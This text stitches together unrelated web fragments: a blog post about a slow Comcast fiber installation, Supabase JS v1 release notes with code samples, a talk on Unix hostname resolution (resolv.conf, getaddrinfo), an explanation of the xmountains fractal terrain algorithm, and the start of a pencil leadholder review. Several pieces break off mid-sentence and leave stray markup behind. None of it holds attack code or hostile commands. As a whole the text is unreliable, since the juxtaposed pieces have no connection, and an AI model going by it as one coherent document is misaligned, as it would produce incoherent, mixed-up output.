<figure><img loading="lazy" width="810" height="1080" src="https://binaryimpulse.com/wp-content/uploads/2019/10/fibertap-810x1080.jpg" alt="" srcset="https://binaryimpulse.com/wp-content/uploads/2019/10/fibertap-810x1080.jpg 810w, https://binaryimpulse.com/wp-content/uploads/2019/10/fibertap-450x600.jpg 450w, https://binaryimpulse.com/wp-content/uploads/2019/10/fibertap-225x300.jpg 225w, https://binaryimpulse.com/wp-content/uploads/2019/10/fibertap-768x1024.jpg 768w, https://binaryimpulse.com/wp-content/uploads/2019/10/fibertap-1152x1536.jpg 1152w, https://binaryimpulse.com/wp-content/uploads/2019/10/fibertap-1536x2048.jpg 1536w, https://binaryimpulse.com/wp-content/uploads/2019/10/fibertap-scaled.jpg 1920w" sizes="(max-width: 810px) 100vw, 810px"><figcaption>Comcast’s fiber tap near my house.</figcaption></figure>



<p>I went over all of the initial information with sales, pretty much in line with what I had found out during my research.  It would basically cost $1,000 to install and $319.99/month thereafter.  This was not unexpected, but was a large increase over the roughly $70/month I was paying for my cable line, so I decided to give it some thought before proceeding.</p>



<p>My old WOW cable Internet continued to be on the decline in quality, and it didn’t seem like there was any resolution in sight.  This frustration gave me the push I needed, and about a month later in mid-May, I was reaching back out to sales to tell them to get the ball rolling.</p>



<h2>Pre-Installation Process</h2>



<p>Although I appeared to be close by to the fiber tap on the maps, the first step in the process still needed to be an on site survey.  Comcast informed me that they would get someone on the site to make sure I was really eligible, and then we could move forward from there.</p>



<p>It was made clear to me that this was going to be a multiple-month process, and if eligible, we would “try” to get it installed before the winter months came and the ground would become too frozen to dig.</p>



<p>Someone must have come to the site at some point, but no interaction was needed with me.  Comcast didn’t call me back directly, but after a few weeks I called to follow up and was told that my initial site survey had been approved and we were moving forward with the installation.</p>



<p>The next step would be waiting for approvals and permits.  Evidently the install process for Comcast works something like this internally:</p>



<ul><li>Perform site survey to make sure that the building is serviceable.</li><li>Create a formal installation design \ plan and submit it for approval.</li><li>Review of the installation plan by finance team to determine if costs are acceptable to move forward.</li><li>Submit permit requests to applicable local government.</li><li>Begin construction once permits are received.</li></ul>



<p>The whole installation was rife with misinformation from my Comcast representative who always seemed to be out of the loop and a few steps behind on the process, which makes me wonder who is really in charge of coordinating the tasks.  I don’t hold this against him but I do think there is a ton of room for Comcast to improve communication both internally and with their customer during this long process.</p>



<p>A few examples of such confusion \ misinformation throughout the process:</p>



<ul><li>Around a month after being told my site survey was complete, I received a call from the construction contractor asking to schedule a time to meet me for a site survey.  Apparently this was when he was out to draw up the design.</li><li>At one point, I was told by Comcast that we were “waiting on permits” from the government and then told by the cable installer contractor that we were waiting on Comcast for financial approval.  That turned out to be correct, and once it was approved then the wait for permits began.</li><li>When construction began, I called up my Comcast rep to inform him of the progress, but couldn’t reach him.  The next day he called me to inform me that the permits had come in and we could start construction soon.  (Though it already started a day earlier.)</li></ul>



<h2>5 Months Later</h2>



<p>Most of what I had read online suggested that it was about a 3 month lead time from inquiry to install, but for me this was not correct.</p>



<p>Finally after months of waiting for permits and approval and seemingly making no progress, the contractor called me to inform me that they were scheduling directional boring.  From mid-May to the beginning of October, we were finally ready to get some actual work done.</p>



<p>The installation would happen in 4 stages:</p>



<ul><li><strong>Directional Boring</strong> – The cable contractor installed an orange conduit several feet underground leading from my back yard to the utility pole where the fiber tap is located.</li><li><strong>Pulling The Cable</strong> – The cable contractor would visit to pull the fiber cable from my basement to the utility pole.</li><li><strong>Splicing</strong> – The cable contractor would visit to add the connections on both ends of the cable and plug it in.</li><li><strong>Setup</strong> – Comcast would send out a representative to install the Juniper router and actually bring the connection up.</li></ul>



<h2>Directional Boring</h2>



<p>The directional boring process began for me on the last day of September.  No appointment was necessary, I simply awoke in the afternoon to the sound of machinery running outside.  I had missed the voicemail from the contractor so I wasn’t even aware anyone would be coming – it was a really nice surprise.</p>



<p>Most of the work occurred in the utility easement behind my house.  They did have to bore into my backyard, but they only dug a single hole next to the house.  It doesn’t appear they even brought the equipment into my yard.</p>

<p>This was such a process, they actually had to leave their equipment overnight and finish the next day.  Of course, being as excited as I was, I had to go back and take some pictures to document this part too!</p>

<h2>Running The Cable</h2>



<p>I eagerly waited for the next step to begin, and for me it took about 10 days.  I awoke to a few missed calls, and Comcast’s contractor was telling me they had some crews nearby and asking if they could do the installation that day.</p>



<p>I had work in a few hours, but I’d been waiting for this so eagerly for so long, so I made it work.  The crew came out and promptly finished the inside part of the job so I could go to work on time</p>

<p>When I returned from work, I was thrilled to see that the fiber was hanging from the utility pole.  I went out the next morning to take some pictures.</p>

<p>Now, I was just simply waiting for step 3 of the install – to schedule the guy to come out and splice the connection.  The Comcast contractor informed me that we were waiting on final schematics from Comcast to proceed.</p>



<p>Almost 2 weeks later, there was still no update.  There were some changes on the pole though, someone had moved my fiber around and made this mess that looked like it was ready to fall down any minute!</p>

<p>At this point, my contact at the contractor stopped answering my calls, and his voicemail box was full.  I was so eager to continue the install, but even Comcast was not able to update me on what was going on.</p>



<h2>Disaster Strikes… Temporarily.</h2>



<p>During the wait, we had a weekend where we got very large amounts of rain.  I was getting ready for bed one Saturday night, and ran down to the basement to quickly grab something.  There, I was shocked to find my floor flooded.</p>

<p>At first, I was just very surprised and confused.  The areas where this water was located were not areas where there were any pipes or pumps very close by to account for the reason why there was water there. </p>



<p>It hadn’t even dawned on me right away to check the fiber, until I swore I saw it drip while I was standing there trying to figure out what had happened.  Sure enough, I gave it a little shake, and:</p>



<figure><img loading="lazy" width="607" height="1080" src="https://binaryimpulse.com/wp-content/uploads/2019/11/leaky-fiber-607x1080.jpg" alt="" srcset="https://binaryimpulse.com/wp-content/uploads/2019/11/leaky-fiber.jpg 607w, https://binaryimpulse.com/wp-content/uploads/2019/11/leaky-fiber-337x600.jpg 337w, https://binaryimpulse.com/wp-content/uploads/2019/11/leaky-fiber-169x300.jpg 169w" sizes="(max-width: 607px) 100vw, 607px"><figcaption>Leaky fiber conduit.</figcaption></figure>



<p>Fortunately, after a Sunday afternoon call to the cable contractors, they quickly sent someone out the next day to fix the issue (right before a week with lots of rain, too).  Fortunately in the end, nothing of any value was damaged.  The contractors did some additional sealing where the fiber comes into my house, as well as at the fiber vault, so we are hoping this issue is now solved.</p>



<p>I should note, my house is located at a very low elevation.  The fiber cable is at a much higher elevation than my basement for most of its run, and my backyard is very sloped.  This did not occur due to a poorly sealed entry point, they did a nice job sealing around the wall penetration, what actually happened was water entered the fiber …</p></div></div>

While they're still a work in progress, here are some things we think you'll like:</p><ul><li>The <a href="https://supabase.io/docs/client/supabase-client">Reference Docs</a> are auto-generated from our Typescript definitions and then enriched with examples. This forces us to document our code and makes it easier to keep everything in sync.</li><li>We added placeholders for the other languages that the community is developing. They have already started with Python, C#, Dart, Rust, and Swift. Expect to see the docs filling up soon!</li><li>We've added sections for all of the open source tools we use, including <a href="https://supabase.io/docs/postgres/server/about">Postgres</a>, <a href="https://supabase.io/docs/postgrest/server/about">PostgREST</a>, <a href="https://supabase.io/docs/gotrue/server/about">GoTrue</a>, and <a href="https://supabase.io/docs/realtime/server/about">Realtime</a>. We'll be filling these with lots of valuable information including self-hosting, benchmarks, and simple guides.</li></ul><h3>Errors are returned, not thrown</h3><p>We attribute this improvement to community feedback. This has significantly improved the developer experience. Previously we would throw errors:</p><div><div><div><div><p><span>try</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>const</span><span> </span><span>{</span><span> body </span><span>}</span><span> </span><span>=</span><span> supabase</span><span>.</span><span>from</span><span>(</span><span>'todos'</span><span>)</span><span>.</span><span>select</span><span>(</span><span>'*'</span><span>)</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>catch</span><span> </span><span>(</span><span>error</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>console</span><span>.</span><span>log</span><span>(</span><span>error</span><span>)</span><span></span></p><p><span></span><span>}</span></p></div></div></div></div><p>And now we simply return them:</p><div><div><div><div><p><span>const</span><span> </span><span>{</span><span> data</span><span>,</span><span> error </span><span>}</span><span> </span><span>=</span><span> supabase</span><span>.</span><span>from</span><span>(</span><span>'todos'</span><span>)</span><span>.</span><span>select</span><span>(</span><span>'*'</span><span>)</span><span></span></p><p><span></span><span>if</span><span> </span><span>(</span><span>error</span><span>)</span><span> </span><span>console</span><span>.</span><span>log</span><span>(</span><span>error</span><span>)</span><span></span></p></div></div></div></div><p>After testing this for a while we're very happy with this pattern. Errors are handled next to the offending function. Of course you can always rethrow the error if that's your preference.</p><h3>We created <code>gotrue-js</code></h3><p>Our goal for <code>supabase-js</code> is to tie together many sub-libaries. Each sub-library is a standalone implementation for a single external system. This is one of the ways we support existing open source tools.</p><p>To maintain this philosophy, we created <a href="https://github.com/supabase/gotrue-js" target="_blank" rel="noopener noreferrer"><code>gotrue-js</code></a>, a library for Netlify's GoTrue auth server. This libary includes a number of new additions, including third-party logins.</p><p>Previously:</p><div><div><div><div><p><span>const</span><span> </span><span>{</span><span></span></p><p><span>  body</span><span>:</span><span> </span><span>{</span><span> user </span><span>}</span><span>,</span><span></span></p><p><span></span><span>}</span><span> </span><span>=</span><span> </span><span>await</span><span> supabase</span><span>.</span><span>auth</span><span>.</span><span>signup</span><span>(</span><span></span></p><p><span>  </span><span>'someone@email.com'</span><span>,</span><span></span></p><p><span>  </span><span>'password'</span><span></span></p><p><span></span><span>)</span></p></div></div></div></div><p>Now:</p><div><div><div><div><p><span>const</span><span> </span><span>{</span><span> user</span><span>,</span><span> error </span><span>}</span><span> </span><span>=</span><span> </span><span>await</span><span> supabase</span><span>.</span><span>auth</span><span>.</span><span>signUp</span><span>(</span><span>{</span><span></span></p><p><span>  email</span><span>:</span><span> </span><span>'someone@email.com'</span><span>,</span><span></span></p><p><span>  password</span><span>:</span><span> </span><span>'password'</span><span></span></p><p><span></span><span>}</span><span>)</span></p></div></div></div></div><h3>Enhancements and fixes</h3><ul><li>Native Typescript. All of our libraries are now natively built with Typescript: <a href="https://github.com/supabase/supabase-js" target="_blank" rel="noopener noreferrer"><code>supabase-js</code></a>, <a href="https://github.com/supabase/postgrest-js" target="_blank" rel="noopener noreferrer"><code>postgrest-js</code></a>, <a href="https://github.com/supabase/gotrue-js" target="_blank" rel="noopener noreferrer"><code>gotrue-js</code></a>, and <a href="https://github.com/supabase/realtime-js" target="_blank" rel="noopener noreferrer"><code>realtime-js</code></a>.</li><li>Better realtime scalability: we only generate one socket connection per Supabase client.

We've detailed these in the <a href="https://github.com/supabase/supabase-js/releases/tag/v1.0.1" target="_blank" rel="noopener noreferrer">release notes</a>, but here are a few to be aware of:</p><ul><li><code>signup()</code> is now <code>signUp()</code> and <code>email</code> / <code>password</code> is passed as an object</li><li><code>logout()</code> is now <code>signOut()</code></li><li><code>login()</code> is now <code>signIn()</code></li><li><code>ova()</code> and <code>ovr()</code> are now just <code>ov()</code></li><li><code>body</code> is now <code>data</code></li></ul><p>Previously:</p><div><div><div><div><p><span>const</span><span> </span><span>{</span><span> body </span><span>}</span><span> </span><span>=</span><span> supabase</span><span>.</span><span>from</span><span>(</span><span>'todos'</span><span>)</span><span>.</span><span>select</span><span>(</span><span>'*'</span><span>)</span></p></div></div></div></div><p>Now:</p><div><div><div><div><p><span>const</span><span> </span><span>{</span><span> data </span><span>}</span><span> </span><span>=</span><span> supabase</span><span>.</span><span>from</span><span>(</span><span>'todos'</span><span>)</span><span>.</span><span>select</span><span>(</span><span>)</span></p></div></div></div></div><h3>Upgrading</h3><p>We have documented all of the changes in the <a href="https://github.com/supabase/supabase-js/releases/tag/v1.0.1" target="_blank" rel="noopener noreferrer">release notes</a>. </p><p>To summarise the steps:</p><ol><li>Install the new version: <code>npm install @supabase/supabase-js@latest</code></li><li>Update all your <code>body</code> constants to <code>data</code></li><li>Update all your <code>supabase.auth</code> functions with the new <a href="https://supabase.io/docs/client/auth-signup">Auth interface</a></li></ol><h3>Get started</h3><ul><li>Start using Supabase today: <a href="https://app.supabase.io/" target="_blank" rel="noopener noreferrer">app.supabase.io</a></li><li>Make sure to <a href="https://github.com/supabase/supabase" target="_blank" rel="noopener noreferrer">star us on GitHub</a></li><li>Follow us <a href="https://twitter.com/supabase_io" target="_blank" rel="noopener noreferrer">on Twitter</a></li><li>Become a <a href="https://github.com/sponsors/supabase" target="_blank" rel="noopener noreferrer">sponsor</a></li></ul></section></article></div>]]>

<p><img src="https://venam.nixers.net/blog/assets/resolving_hostname/What_Does_It_Take_To_Resolve_A_Hostname2.jpg" alt="slide2"></p>

<p>Resolving a domain name is complex.  It’s not limited to the DNS, the
Domain Name System — A decentralized and hierarchical system to associate
names and other information to IP addresses.<br>
It’s not something we, as users, usually pay attention to.  We notice
it only when we’re facing an issue. It normally works out of the box
but really nobody get the crux.<br>
You search online for clarifications but they barely help and add more
confusion.</p>

<p>Here are some schemas trying to decipher the mystery that domain name
resolution came to be.</p>

<p><img src="https://venam.nixers.net/blog/assets/resolving_hostname/What_Does_It_Take_To_Resolve_A_Hostname3.jpg" alt="slide3"></p>

<p>One, two, and three, I think you get me, it is not easy.  It’s never as
simple as taking a hostname as a string, getting the DNS address in the
<code>/etc/resolv.conf</code> config, then sending a request to the DNS on port 53
to be greeted back with the IP.<br>
Behind the scene there are ton of files and libraries involved, all of
this to get a domain name solved.</p>

<p>So in this talk we’ll try to create some order to try to understand thing
as an end-user. Let’s make sense and reason behind this mess even if I
have to say, I don’t get it much myself.<br>
I can’t assess I haven’t made mistakes but if I did, please correct me,
that would be great!</p>



<p><img src="https://venam.nixers.net/blog/assets/resolving_hostname/What_Does_It_Take_To_Resolve_A_Hostname4.jpg" alt="slide4"></p>

<p>Let’s start with the misfits, the ones that don’t follow the rules,
the not-invented-here syndrome found within our tools.<br>
When it comes to DNS resolution, there’s no one-size fit all
solution. Obviously, many of us don’t want to deal with all the
complexity, so we say, “let’s pack these bytes ourselves, and forget
the hassle”.<br>
That’s pure heresy though. We’d prefer everything to work the same way,
so that it’s easier to follow. It would be preferable that they all use
the same lib, to all have the same behavior. That is, in our case to rely
on the C standard lib, or the POSIX API our savior.</p>

<p>In all cases, let’s note some software that don’t rely on it, as we said,
all the misfits.</p>

<ul>
  <li>The ISC/BSD BIND tools: from host, to dig, to drill, to nslookup,
and more, used for debugging chores.</li>
  <li>Firefox/Chrome/Chromium: There are the browsers, because they are one
of a kind, bypassing libc and POSIX mechanism, implementing their own
DNS API for performance reasons and perfectionism.</li>
  <li>Any applications needing advanced DNS features, other than simple name to IP.</li>
  <li>Language that don’t wrap around a libc: The Go programming language
comes to mind. It implements it’s own resolver API.</li>
</ul>

<p>Fortunately, I can ease your mind by letting you know that all
of these will at least respect <code>/etc/resolv.conf</code> and <code>/etc/hosts</code>
configurations. Files that we’ll see in the next sections.</p>



<p><img src="https://venam.nixers.net/blog/assets/resolving_hostname/What_Does_It_Take_To_Resolve_A_Hostname5.jpg" alt="slide5"></p>

<p>I’ve taken a look at over a dozen different technologies and I think the
best way to understand them is through their archaeologies. There’s a
lot that can be explained about DNS resolution simply based on all the
historic reasons.<br>
The main thing you need to understand, is that there’s not a single
clean library call to resolve a hostname. Standards and new specs have
pilled up over the years, with some software that haven’t followed,
but risking to disappear.</p>

<p>Overall, libc and POSIX provide multiple resolution APIs:</p>

<ul>
  <li>There’s the historic, low level one provided by ISC/BSD BIND resolver
implementation within libc. Accessed though <code>libresolv/resolv.h</code>
incantation.</li>
  <li>The <code>gethostbyname(3)</code> and related functions, implementing an obsolete
POSIX C specification.</li>
  <li>The <code>getaddrinfo(3)</code>, that is the modern POSIX C API for name
resolution.</li>
</ul>

<p>All these combinations, ladies and gentlemen, are the standard ways
to resolve a name.<br>
Newer applications will use <code>getaddrinfo</code> while older ones will use
<code>gethostbyname</code>. Both of these 2 will often rely on something called
NSS and another part to manage <code>resolv.conf</code> access.</p>

<p>Now let’s dive into each of these and you’ll get them like a breeze.</p>



<p><img src="https://venam.nixers.net/blog/assets/resolving_hostname/What_Does_It_Take_To_Resolve_A_Hostname6.jpg" alt="slide6"></p>

<p>The resolver layer is the oldest and most stable in our quest. It
originates from 1983, today almost 37 years ago, at Berkeley university.</p>

<p>It comes from a project called BIND, Berkely Internet Name Domain, which
was sponsored by a DARPA grants. And like the Berkeley socket that gave
rise to the internet, it has now turned into much much pain.<br>
It was the very first implementation of the DNS specifications. It got
released in BSD4.3 and today the BIND project is maintained by the
Internet Systems Consortium, aka ISC.</p>

<p>It not only offers servers and clients, and the debug tools which we
mentioned earlier, but also offers a library called “libbind”. This
library is the defacto implementation, the standard resolver, the one
of a kind. It is initially based on all the original RFC discussions,
namely RFC 881, 882, and 883.<br>
The BSD people wrote technical papers assessing its feasibility, and
went on recommending and implementing it within BSD.</p>

<p>At that point BIND wasn’t a standard yet, it was an optionally-compiled
code for those who wanted to get their feet wet, those who wanted to
try DNS.<br>
Then it got part of the C standard library interface through <code>resolver</code>,
<code>libresolv</code>, <code>-lresolv</code>, <code>resolv.h</code>, and closed the case</p>

<p>If you take a look at most Unix-like systems today, from MacOS, to
OpenBSD, to Linux, and company, you’ll see clearly in <code>resolv.h</code>, the
copyright going back to 1983, to that very date. But obviously, it depends
on the choice of the implementer, a case by case</p>

<p>So then the code diverged, there’s the libresolv provided
by the C standardization and the libbind provided by the BIND
implementation. However, most Unix only add small specific changes to
their needs. For example, resolver in glibc is baselined off libbind
from BIND version 8.2.3.</p>

<p>This layer is normally used for low level DNS interactions because it’s
missing the goodies we’ll see later in this presentation.</p>

<p>Now let’s talk about environments and configurations.</p>

<p>The resolver configuration file</p>

<p>The resolver configuration files were mentioned in BIND first release,
in section 4.2.2.2 of “The Design and Implementation of ‘Domain Name
Resolver’” by Mark Painter based on RFC883, part of the DNS RFC series.</p>

<p>This particular file being <code>/etc/resolv.conf</code>, you’ll see it hardcoded in
<code>resolv.h</code> and if that file is missing, it’ll fall back to the localhost
as the DNS, just to be safe.<br>
Additionally, there’s <code>/etc/host.conf</code>, according to the manpage also
“the resolver configuration file”, it’s so appropriately named. It’s a
conf that dictates the working of <code>/etc/hosts</code>, the “static table lookup
for hostsnames”.</p>

<p>So what’s in these files.<br>
<code>resolv.conf</code> takes care of how to resolve names and which <code>nameserver</code>
to use for that, while <code>hosts</code> simply has a list of known host aliases,
ip + name, as simple as that.</p>

<p>Within <code>resolv.conf</code> you can also have a <code>search</code> list for domains.
That’s if a name you’re searching for doesn’t have the minimum number
of dots in it then it’ll add one of these TLD to it, top-level-domains,
and keep searching until it finds something that fits.<br>
This can also be manipulated in an environment variable <code>LOCALDOMAIN</code>.</p>

<figure><pre><code data-lang="shell"><span>$ </span><span>echo</span> <span>'example www.example.com'</span> <span>&gt;</span> ./host_aliases
<span>$ HOSTALIASES</span><span>=</span><span>"./host_aliases"</span> getent hosts example
93.184.216.34   www.example.com</code></pre></figure>

<p>There can also be a sortlist IP netmask, for when there’s many results
to match but you don’t want to give priority to the cloud VPS that lives
only for cash.</p>

<p>Finally, there’s the <code>option</code> field, also overriden on the command
line by the <code>RES_OPTIONS</code> environment variable. It manipulates the minimum
number of dots we mentioned and also if you want can set debug as enabled.</p>

<p>Meanwhile, the <code>hosts</code> file is but a key-value db, simply made of domain
names and IPs.</p>

<p>Its config also lets you change the order of results and for the rest
you have <code>host.conf</code> to consult.</p>

<p>So remember, that all of these are mostly used everywhere because it’s
the lowest layer.  So it’s used by libbind and libresolv but also the
custom NIH syndrome</p>

<p>Alright, so far that’s all classic clean stuff. Let’s move on to the
next sections, you’ll scratch your head until there’s no dandruff.</p>



<p><img src="https://venam.nixers.net/blog/assets/resolving_hostname/What_Does_It_Take_To_Resolve_A_Hostname7.jpg" alt="slide7"></p>

<p>The C library POSIX specs create a superset over the C standard
library. They add a few simpler calls to resolve hostnames and make it
easy. These focus on returning A and AAAA records only, ipV4 and ipV6
respsectively.<br>
There’s <code>gethostbyname(3)</code> which is deprecated, and there’s the newer
<code>getaddrinfo(3)</code> defined in IEEE Std 1003.1g-2000, which mainly adds
RFC3493 aka ipV6 is now supported.  So applications are recommended to
use this updated version unless they want to divert from mainland.</p>

<p>There are functions to resolve IP addresses to host names, but let’s
focus only on name to ip for today, I know it’s lame.</p>

<p>Apart from ipV6 support being added, some internal structures have been
updated as they weren’t so safe between subsequent calls and thus could
be your demise and your fall.</p>

<p>Obviously they both return different structures.</p>

<p><code>hostent</code> struct is returned to <code>gethostbyname</code> function caller.
while <code>getaddrinfo</code> returns an <code>addrinfo</code> structure.
Both being defined in the <code>netdb.h</code> header.</p>

<figure><pre><code data-lang="c"><span>struct</span> <span>hostent</span> <span>{</span>
	<span>char</span>  <span>*</span><span>h_name</span><span>;</span>            <span>/* official name of host */</span>

	<span>char</span> <span>**</span><span>h_addr_list</span><span>;</span>       <span>/* list of addresses */</span>
<span>}</span></code></pre></figure>

<figure><pre><code data-lang="c"><span>struct</span> <span>addrinfo</span> <span>{</span>
	<span>int</span>              <span>ai_flags</span><span>;</span>
	<span>int</span>              <span>ai_family</span><span>;</span>
	<span>int</span>              <span>ai_socktype</span><span>;</span>
	<span>int</span>              <span>ai_protocol</span><span>;</span>
	<span>socklen_t</span>        <span>ai_addrlen</span><span>;</span>

	<span>struct</span> <span>addrinfo</span> <span>*</span><span>ai_next</span><span>;</span>
<span>};</span></code></pre></figure>

<p>Some libc implementations will get fancy and add their own modified
versions of <code>gethostbyname</code>. For instance in glibc they add support for
ipV6 in their modified <code>gethostbyname2</code> for backward compatibility.</p>

<p>Regarding configuration files, <code>getaddrinfo</code> will consult <code>/etc/gai.conf</code>
which takes care of the precedence of the addresses returned in the
results. And now, you’re going to brandish your …</p></article></div></div>

<p>
<a href="https://spbooth.github.io/xmountains/">
Xmountains</a> is a fractal terrain generator written by
Stephen Booth 
This document describes what it does and how it works.
</p>

<p>
The basic idea behind a fractal landscape is to generate a continuous surface 
which varies in height randomly but with the random variation obeying a
particular statistical law.
</p>

<p>
In the case of a fractal landscape the average difference in height
between pairs of points separated by a distance <i>l</i> should go as 
a power law in <i>l</i>. If you are only interested in random terrain
generation rather than fractal self-similarity then you could use other
functions of <i>l</i> that tend to zero as <i>l</i> tends to zero.
If the function does not tend to zero then the result will not be
continuous. I use the following definition:
</p>
<a name="fractal">
<i>
<pre>                      2H
    &lt;|H1 - H2|&gt;  =  l
</pre>
</i>
</a>
<p>
For values of H below 0.5 as <i>l</i> gets small the variation in height
is greater than the 
horizontal distance between the points (<i>l</i>) so the surface becomes
space-filling. For values of H at 0.5 or above the surface becomes
smoother as H increases. This is because the variation in height at
short length scales is a smaller fraction of the variation at longer
length scales. When displaying the surface you usually re-scale the whole
lot by a constant factor so it is the relative variation that matters.
</p>

<p>
This program uses a modified form the mid-point displacement algorithm
</p>

<p>
The mid-point displacement algorithm is a recursive algorithm.
Starting from a crude outline of the surface more and more detail is
added at progressively smaller length scales.
Each iteration doubles the resolution of a 2 dimensional grid of altitudes. 
</p>
<p>
This is done in 2 stages:
</p>
<pre>A           B                  A           B
                stage1
               ---------&gt;            E

C           D                  C           D



A           B                  A     F     B
                 stage2
      E         --------&gt;      G     E     H

C           D                  C     I     D
</pre>
<p>
More detail can then be filled in by recursion:
</p>
<pre>A     F     B                  A     F     B
                 stage1           *     *
G     E     H   --------&gt;      G     E     H
                                  *     *
C     I     D                  C     I     D


A     F     B                  A  +  F  +  B
   *     *       stage2        +  *  +  *  +
G     E     H   --------&gt;      G  +  E  +  H
   *     *                     +  *  +  *  +
C     I     D                  C  +  I  +  D

</pre>

<p>
The new points are generated by taking an average of the surrounding points
and adding a random offset. In order to generate the power law behaviour
described <a href="#fractal">above</a> the random offset is scaled by a factor
proportional to a power (2H in my notation) of the distance between the new
points and the
surrounding points. The results seem to be a little better if the random
offsets are taken from a gaussian distribution. The basic idea is very
similar to that used by the Koch snowflake.
</p>
<p>
The modifications to the standard algorithm are as follows:
There are three optional <a href="#regen">regeneration steps</a> to reduce
<a href="#crease">creasing</a>. These are controlled by the 
<a href="#smooth">-s flag</a>.
</p>
<p>
The <a href="#cross">-x flag (cross update)</a> controls whether the 
midpoints (E) are included
in the average when performing the stage2 update or if only the corner
points are used.
</p>

<h2> <a name="crease">Creasing</a> </h2>
<p>
When I started in this game "creasing" was a big problem with square
grid mid-point displacement surfaces 
and explicit smoothing steps were introduced to get rid of these.
You can make my program revert to these early algorithms by specifying
"-s 0" Things are particularly bad if you calculate the middle of the sides
independently of the middle of the square ("-x" in my program)
This was not uncommon in the other programs I have seen.
</p>
<h3> <a name="cross">Cross updates</a></h3>
<p>
If you only use a pair of points to perform the average for the middle
of the sides then for any point that lies on one of the sides of a
large length scale square its value depends ONLY on the values of other
points that lie along that side. This line then forms a crease. Because
no information ever crosses this line it acts as a kind of "event
horizon". The heights of points on the crease are calculated
independently of everything else and then the surfaces on the 2 sides
form to match this line but the 2 surfaces are independent of each
other. The crease is a mis-match between the 2 independent surfaces that
are only constrained to follow a common boundary that has been specified
independently of each of them  
<br>
<img src="https://spbooth.github.io/xmountains/crease.gif" alt="A fractal landscape with creases">
</p>
<p>
When you split the update into 2 steps:
</p><ol>
<li> generate the middle of the square with an average of the 
   4 corners and a random offset based on a length scale of L/sqrt(2). 
</li>
<li> generate the sides as an average over 4 points (2 corner points and
   2 middle of square points) followed by a random offset based on a
   length scale of L/2. 
</li>
</ol>
the information flows sideways into the sides of the large squares.
The problem does not go away but instead of creases along the sides of
the squares you get conical deformations at the corners of the squares:
<br>
<img src="https://spbooth.github.io/xmountains/cone.gif" alt="A fractal landscape with conical deformations">
<br>
This is an improvement but not the whole story.

<h3><a name="regen">Regeneration steps</a></h3>
<p>

The root cause of <a href="#crease">creasing</a> and the conical
deformations is that the position 
of some points are fixed by the early (long-distance) iterations of the
fractal algorithm. We are trying to generate a surface where the average
difference in height between points on the surface is a function of the
distance between them. Ideally two points should have an equal effect on
each other. Instead we have implemented a hierarchy of points where the
information only flows in one direction.
</p>
<p>
The solution I came up with was to use the early iteration to set the
overall trend of the surface rather than setting the exact position of
particular points. This is done by a 2 steps forward/1 step back method.
In the original algorithm the results at the end of one iteration are
used to generate a new set of points with each iteration adding detail at a
length scale of half the previous iteration. I added a second stage to
each iteration that consisted of discarding all of the points generated
by previous iterations and regenerating them from the new points.
I think this is a lot closer to the desired result because every point
is the result of updates at all length scales. 
<br>
<img src="https://spbooth.github.io/xmountains/normal.gif" alt="a fractal landscape">
<br>
However I have a
suspicion that it may result in a slight shift in the fractal dimension.
It would be nice to measure the fractal dimension produced as a function
of the input parameter to the algorithm.
</p>
<p>
A regeneration step recalculates the height of existing points using an
average and offset from a newer generation of points. In xmountains the three
regeneration steps are:
</p>
<dl>
<dt> Step 1 </dt>
<dd> recalculate corner points (A,B,C,D) from the midpoints (E)
        after the stage1 update. </dd>
<dt> Step 2 </dt>
<dd>  recalculate midpoints (E) from the edge points (F,G,H,I)
        after the stage2 update </dd>
<dt> Step 3 </dt>
<dd>  recalculate corner points (A,B,C,D) from the edge points (F,G,H,I)
        after the stage2 update </dd>
</dl>
<p>
The regeneration stages are turned on by the smoothing parameter 
<a name="smooth">(-s flag)</a>
</p>
<pre>  flag	Step-3	Step-2	Step-1
  0	off	off	off
  1	on	off	off
  2	off	on	off
  3	on	on	off
  4	off	off	on
  5	on	off	on
  6	off	on	on
  7	on	on	on
</pre>
<p>
The default is to just use step 3 (-s 1)
</p><p>
When performing the regeneration steps the random offset is added to an
average of the new points.
</p>
<p>
I came across a different solution in the xmnts program by 
<em>
 Paul Sharpe @ DEC, Reading, England. 
</em>
who also modified the old points at each iteration, but he only added an
additional random offset to the old points.
</p>
<p>
I added this capability to  my program. The -X and -Y parameters
trade off the two methods if you leave them at 0.0 (the default) you get
my algorithm. If you set them to 1.0 you get Paul's and values
in-between give you a mixture of the two, i.e. a weighted average of the
new points and the old value of the point.
</p>
<h3>How well does this all work</h3>
The relative importance of the different algorithms can easily be seen
if we remove the random element from the algorithm and replace the
gaussian random number with a constant value. Without any random
variation we should get a completely smooth surface. Without any
regeneration steps or cross updates we get a surface
consisting only of creases.
<br>
<img src="https://spbooth.github.io/xmountains/quilt.gif" alt="A surface that looks like a quilt">
<br>

 The addition of cross updates generate 
a very interesting surface.
<br>
<img src="https://spbooth.github.io/xmountains/cushion.gif" alt="a surface that looks like a cushion">
<br>

 This is an
improvement as the surface has better rotational symmetry but it still
has significant artifacts. These are completely missing when regeneration
steps are used.

<h2> Pipelining </h2>
<p>
The other trick I came up with was to pipeline the code. This is also
responsible for much of the speed because it reduces swapping and
improves cache use. I don't think that anyone else does this but 
the idea is straightforward once you think of it. 
</p>
<p>
If you think of the normal algorithm it is possible to add extra detail
to a region of the surface without adding this level of detail to the
entire surface.  Each iteration of the algorithm increases the number of
squares by 4. You can then add further detail to a restricted region of
the surface by only applying the next level of recursion to a subset of
these squares. Obviously some squares you choose not to update 
will end up partially updated because they share sides with updated
squares. 
</p>
<p>
As an aside this selective updating allows you to zoom-in on a surface
efficiently. You don't bother updating squares outside of your field of
view and you keep adding more detail to the squares you can see until
the sides of the smallest level squares subtends less than a maximum
angle at your point of view (i.e. the sides always look short).
</p>
<p>
What I do in xmountains is slightly different. 
I only perform updates necessary to fully update the left hand
row of squares. These fully updated points are used to generate a column
of pixels in the output and then discarded. The new left hand edge is
not fully updated so additional updates are now required.
Imagine I have a level-1 surface as …</p></div>

<p><em>The leadholders</em></p>
<p>From Koh-I-Noor we have the Toison D’Or 5900 and 5608 2.0mm leadholders.  In an accompanying role are Koh-I-Noor colour leads.</p>
<p><img src="http://www.penciltalk.org/images/penciltalk.org.kin.6.jpg" alt="Koh-I-Noor 2.0mm leadholders and colour leads"></p>
<p>The 5900 is a leadholder which seems to be modelled on the Toison d’Or woodcase pencil. The weight and hardness of the body suggest metal composition, but I could be wrong.</p>
